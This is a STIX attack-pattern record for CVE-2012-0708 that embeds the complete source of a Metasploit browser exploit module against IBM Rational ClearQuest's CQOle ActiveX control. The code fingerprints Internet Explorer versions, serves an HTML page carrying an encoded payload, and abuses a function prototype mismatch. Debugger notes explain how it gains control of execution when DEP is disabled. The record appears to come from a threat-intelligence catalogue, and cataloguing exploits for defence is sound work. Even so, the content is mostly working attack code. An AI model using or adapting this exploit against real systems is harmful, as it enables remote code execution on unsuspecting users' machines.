{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9defbbdd-09c3-44f9-abd9-ed4e93d46fcd",
    "created": "2024-08-14T16:41:03.225907Z",
    "modified": "2024-08-14T16:41:03.225911Z",
    "name": "\"IBM Rational ClearQuest CQOle Remote Code Execution\"",
    "description": " This module exploits a function prototype mismatch on the CQOle ActiveX control in IBM Rational ClearQuest < 7.1.1.9, < 7.1.2.6 or < 8.0.0.2 which allows reliable remote code execution when DEP isn't enabled.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/clear_quest_cqole.rb",
            "external_id": "clear_quest_cqole.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0708"
        },
        {
            "source_name": "reference",
            "url": "http://www-304.ibm.com/support/docview.wss?uid=swg21591705"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/07/11/it-isnt-always-about-buffer-overflow"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"7.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => \"{94773112-72E8-11D0-A42E-00A024DED613}\",\n  #  :method     => \"RegisterSchemaRepoFromFileByDbSet\",\n  #  :rank       => NormalRanking\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM Rational ClearQuest CQOle Remote Code Execution\",\n      'Description'    => %q{\n          This module exploits a function prototype mismatch on the CQOle ActiveX\n        control in IBM Rational ClearQuest < 7.1.1.9, < 7.1.2.6 or < 8.0.0.2 which\n        allows reliable remote code execution when DEP isn't enabled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andrea Micalizzi aka rgod', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0708' ],\n          [ 'BID', '53170' ],\n          [ 'OSVDB', '81443'],\n          [ 'ZDI', '12-113' ],\n          [ 'URL', 'http://www-304.ibm.com/support/docview.wss?uid=swg21591705' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/07/11/it-isnt-always-about-buffer-overflow' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # cqole.dll 7.1100.0.150\n          [ 'Automatic', {} ],\n          [ 'IE 6 / IE7 (No DEP)', {} ], # Because of the nature of the vulnerability no DEP is a requisite\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-05-19',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[1]  #IE 7 on Windows XP\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[1]  #IE 7 on Windows Vista\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    js_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(my_target.arch))\n    object_id = rand_text_alpha(rand(8) + 4)\n    dbset_value = rand_text_alpha(rand(8) + 4)\n    var_payload = rand_text_alpha(rand(8) + 4)\n\n    html = <<-EOS\n    <html>\n    <body>\n    <object id='#{object_id}' classid='clsid:94773112-72E8-11D0-A42E-00A024DED613'></object>\n    <script language=\"JavaScript\">\n    var #{var_payload} = unescape(\"#{js_code}\")\n    #{object_id}.RegisterSchemaRepoFromFileByDbSet(\"#{dbset_value}\", #{var_payload});\n    </script>\n    </body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"#{cli.peerhost}:#{cli.peerport} - Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n=begin\n\n* RegisterSchemaRepoFromFile and no RegisterSchemaRepoFromFileByDbSet is called:\n\nBreakpoint 0 hit\neax=3190b1a0 ebx=00000000 ecx=03015cf0 edx=7835f5d2 esi=0013e200 edi=0000000c\neip=78371062 esp=0013e204 ebp=0013e2b4 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206\nMFC80U!_AfxDispatchCall+0xe:\n78371062 ffd0            call    eax {cqole!OAdSession::RegisterSchemaRepoFromFile (3190b1a0)}\n\n* RegisterSchemaRepoFromFile prototype (it is going to be executed):\n\n.text:31865E40 ; protected: wchar_t * __thiscall OAdAdminSession::RegisterSchemaRepoFromFile(wchar_t const *)\n\nhis ret is: retn    4\n\n* RegisterSchemaRepoFromFileByDbSet prototype (it should be executed):\n\n.text:31866280 ; protected: wchar_t * __thiscall OAdAdminSession::RegisterSchemaRepoFromFileByDbSet(wchar_t const *, wchar_t const *)\n\nhis ret is: retn    8\n\n* When RegisterSchemaRepoFromFile returns to MFC80U!_AfxDispatchCall it is what happens:\n\n0:000> p\neax=00186864 ebx=00000000 ecx=442d618d edx=00070001 esi=0013e200 edi=0000000c\neip=78371064 esp=0013e208 ebp=0013e2b4 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202\nMFC80U!_AfxDispatchCall+0x10:\n78371064 c3              ret\n0:000> dd esp\n0013e208  001dcff4 7835f5d2 fffffffe 78336a3a\n\nESP is pointing to the second argument of RegisterSchemaRepoFromFileByDbSet and no to the stored EIP on\nthe stack. The ret from MFC80U!_AfxDispatchCall allows to get control on a reliable way when DEP is\ndisabled\n\n=end\n",
    "x_mitre_disclosure_date": "2012-05-19",
    "x_mitre_platforms": [
        "win'"
    ]
}